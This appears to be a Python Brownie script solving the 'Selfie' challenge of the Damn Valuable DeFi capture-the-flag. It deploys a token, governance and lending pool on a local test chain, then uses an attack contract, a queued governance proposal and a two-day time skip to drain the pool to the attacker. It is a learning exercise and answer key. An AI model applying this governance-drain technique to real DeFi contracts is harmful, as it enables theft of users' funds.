from brownie import *

def main():
    deployer = a[0]
    attacker = a[1]

    TOKEN_INITIAL_SUPPLY = Wei('2000000 ether')
    TOKENS_IN_POOL = Wei('1500000 ether')

    token = DamnValuableTokenSnapshot.deploy(
        TOKEN_INITIAL_SUPPLY, {'from': deployer})

    governance = SimpleGovernance.deploy(token, {'from': deployer})

    pool = SelfiePool.deploy(token, governance, {'from': deployer})

    token.transfer(pool, TOKENS_IN_POOL, {'from': deployer})

    assert token.balanceOf(pool) == TOKENS_IN_POOL

    # Exploit code here
    attack = SelfieAttack.deploy(token, pool, governance, {'from': attacker})
    attack.propose({'from': attacker})
    chain.sleep(2*24*60*60) # advance 2 days
    chain.mine()
    governance.executeAction(1, {'from': attacker}) # execute drainAllFunds

    # Success condition - attacker has taken all tokens from pool
    assert token.balanceOf(attacker) == TOKENS_IN_POOL
    assert token.balanceOf(pool) == 0

    print('Challenge successfully passed.')

